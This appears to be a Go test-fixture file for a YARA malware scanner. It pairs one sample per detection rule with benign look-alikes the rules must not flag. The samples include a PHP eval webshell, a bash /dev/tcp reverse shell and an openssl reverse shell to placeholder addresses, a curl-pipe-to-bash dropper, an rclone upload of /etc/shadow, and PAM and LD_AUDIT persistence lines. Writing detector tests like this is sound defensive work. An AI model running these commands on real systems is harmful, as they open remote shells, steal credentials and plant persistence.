package yara

// Shared fixtures exercised by both the YARA-X integration tests and the
// pure-Go fallback engine tests (and the cross-engine parity test), so the
// two engines are always validated against identical inputs.

type ruleFixture struct {
	ruleName string
	path     string
	filename string
	payload  []byte
}

// embeddedRuleFixtures mirrors TestYaraX_EmbeddedCoreLinuxRules: one
// true-positive sample per embedded core rule.
var embeddedRuleFixtures = []ruleFixture{
	{
		ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
		path:     "/var/www/html/shell.php",
		filename: "shell.php",
		payload:  []byte("<?php @eval(base64_decode($_POST['cmd'])); ?>"),
	},
	{
		ruleName: "Linux_Webshell_PHP_Known_Families",
		path:     "/var/www/c99.php",
		filename: "c99.php",
		payload:  []byte("<?php // c99shell v2.1 ?>"),
	},
	{
		ruleName: "Linux_Webshell_JSP_Runtime_Exec",
		path:     "/var/www/shell.jsp",
		filename: "shell.jsp",
		payload:  []byte("<% String cmd = request.getParameter(\"cmd\"); Runtime.getRuntime().exec(cmd); %>"),
	},
	{
		ruleName: "Linux_Backdoor_Reverse_Shell_OneLiner",
		path:     "/tmp/rev.sh",
		filename: "rev.sh",
		payload:  []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\n"),
	},
	{
		ruleName: "Linux_Backdoor_Encrypted_Reverse_Shell",
		path:     "/tmp/ssl_rev.sh",
		filename: "ssl_rev.sh",
		payload:  []byte("openssl s_client -quiet -connect 10.0.0.1:443 | /bin/bash\n"),
	},
	{
		ruleName: "Linux_Implant_RedTeam_Persistence_Framework",
		path:     "/tmp/persist.sh",
		filename: "persist.sh",
		payload:  []byte("#!/bin/bash\nmkfifo /tmp/.gs_pipe_1; /bin/bash < /tmp/.gs_pipe_1\n"),
	},
	{
		ruleName: "Linux_Rootkit_LDPRELOAD_Hook_Artifact",
		path:     "/tmp/hook.so",
		filename: "hook.so",
		payload:  append([]byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}, []byte("/etc/ld.so.preload dlsym(RTLD_NEXT readdir")...),
	},
	{
		ruleName: "Linux_Rootkit_Diamorphine_Reptile_Strings",
		path:     "/tmp/diamorph.txt",
		filename: "diamorph.txt",
		payload:  []byte("diamorphine is_invisible hacked_kill"),
	},
	{
		ruleName: "Linux_Malware_Cryptominer_Stratum_Pool",
		path:     "/tmp/config.json",
		filename: "config.json",
		payload:  []byte("{\"algo\": \"randomx\", \"pools\": [{\"url\": \"stratum+tcp://pool.supportxmr.com:3333\"}]}"),
	},
	{
		ruleName: "Linux_Dropper_Remote_Pipe_Shell_Execution",
		path:     "/tmp/drop.sh",
		filename: "drop.sh",
		payload:  []byte("curl -s https://example.com/payload.sh | bash\n"),
	},
	{
		ruleName: "Linux_Ransomware_Python_Locker",
		path:     "/tmp/locker.py",
		filename: "locker.py",
		payload:  []byte("from cryptography.fernet import Fernet\nimport os\nfor r,d,f in os.walk('/'):\n    enc = f.encrypt(b'')\n    os.remove('f')\n"),
	},
	{
		ruleName: "Linux_Malware_Data_Exfiltration_Client",
		path:     "/tmp/exfil.py",
		filename: "exfil.py",
		payload:  []byte("import socket, os, zlib\ns = socket.socket()\nfor r,d,f in os.walk('/'):\n    c = zlib.compress(b'')\n    s.sendall(c)\n# exfil routine\n"),
	},
	{
		ruleName: "Linux_Malware_Data_Exfiltration_Server",
		path:     "/tmp/srv.py",
		filename: "srv.py",
		payload:  []byte("import socket, zlib\ns = socket.socket()\ns.bind(('0.0.0.0', 4444))\ns.listen(5)\nconn, _ = s.accept()\ndata = conn.recv(1024)\nstolen = zlib.decompress(data)\n"),
	},
	{
		ruleName: "Linux_Script_PowerShell_Encoded_Execution",
		path:     "/tmp/ps.sh",
		filename: "ps.sh",
		payload:  []byte("pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=\n"),
	},
	{
		ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
		path:     "/tmp/sync.sh",
		filename: "sync.sh",
		payload:  []byte("rclone sync /etc/shadow remote:backup/data.tar.gz\n"),
	},
	{
		ruleName: "Linux_Persistence_Linker_Audit_Hijack",
		path:     "/etc/profile.d/audit.sh",
		filename: "audit.sh",
		payload:  []byte("export LD_AUDIT=/opt/stealth/libaudit.so\n"),
	},
	{
		ruleName: "Linux_Persistence_PAM_Exec_Suspicious",
		path:     "/etc/pam.d/common-auth",
		filename: "common-auth",
		payload:  []byte("auth optional pam_exec.so /tmp/.session_logger.sh\n"),
	},
}

// benignContentFixtures are legitimate code samples that must not trigger any
// embedded rule: honest request handling, an ordinary TCP server, a plain
// download, a project-dir sync, and a compression backup script.
var benignContentFixtures = []ruleFixture{
	{
		ruleName: "benign_php_form",
		path:     "/var/www/html/contact.php",
		filename: "contact.php",
		payload:  []byte("<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $name = htmlspecialchars($_POST['name']);\n    echo \"<p>Thanks, $name</p>\";\n}\n"),
	},
	{
		ruleName: "benign_tcp_server",
		path:     "/opt/svc/serve.py",
		filename: "serve.py",
		payload:  []byte("import socket\ns = socket.socket()\ns.bind(('127.0.0.1', 8080))\ns.listen(16)\nwhile True:\n    conn, addr = s.accept()\n    conn.sendall(b'hello\\n')\n    conn.close()\n"),
	},
	{
		ruleName: "benign_download",
		path:     "/home/user/bin/fetch.sh",
		filename: "fetch.sh",
		payload:  []byte("#!/bin/sh\ncurl -s https://example.com/releases/app-1.2.3.tar.gz -o /tmp/app-1.2.3.tar.gz\n"),
	},
	{
		ruleName: "benign_rclone_project_sync",
		path:     "/home/user/bin/sync-builds.sh",
		filename: "sync-builds.sh",
		payload:  []byte("#!/bin/sh\nrclone sync ./dist remote:builds/latest\n"),
	},
	{
		ruleName: "benign_backup_compress",
		path:     "/opt/backup/nightly.py",
		filename: "nightly.py",
		payload:  []byte("import os, zlib\nfor root, dirs, files in os.walk('/srv/data'):\n    for f in files:\n        blob = zlib.compress(open(os.path.join(root, f), 'rb').read())\n        store(blob, f)\n"),
	},
}
